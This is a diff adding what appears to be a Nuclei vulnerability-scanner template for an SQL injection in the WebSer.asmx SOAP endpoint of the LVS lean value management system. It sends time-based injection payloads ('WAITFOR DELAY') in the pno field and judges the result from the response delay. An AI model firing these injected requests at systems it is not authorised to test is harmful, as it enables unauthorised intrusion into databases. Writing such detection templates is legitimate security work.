@@ -1,0 +1,64 @@
+id: LVS-WebSer-sql
+
+info:
+  name: LVS精益价值管理系统 WebSer.asmx 存在SQL注入漏洞
+  author: LVS
+  severity: medium
+  tags: LVS
+
+http:
+  - raw:
+      - |
+        POST /WebSer.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/OutStore"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Header>
+            <AuthenticationHeader xmlns="http://tempuri.org/">
+              <UserName></UserName>
+              <Password></Password>
+            </AuthenticationHeader>
+          </soap:Header>
+          <soap:Body>
+            <OutStore xmlns="http://tempuri.org/">
+              <pno>1';WAITFOR DELAY '0:0:2'--</pno>
+            </OutStore>
+          </soap:Body>
+        </soap:Envelope>
+
+      - |
+        POST /WebSer.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/OutStore"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Header>
+            <AuthenticationHeader xmlns="http://tempuri.org/">
+              <UserName></UserName>
+              <Password></Password>
+            </AuthenticationHeader>
+          </soap:Header>
+          <soap:Body>
+            <OutStore xmlns="http://tempuri.org/">
+              <pno>1';WAITFOR DELAY '0:0:4'--</pno>
+            </OutStore>
+          </soap:Body>
+        </soap:Envelope>
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - 'duration_1>=2 && duration_1<4'  
+          - 'duration_2>=4 && duration_2<6'
+        condition: and
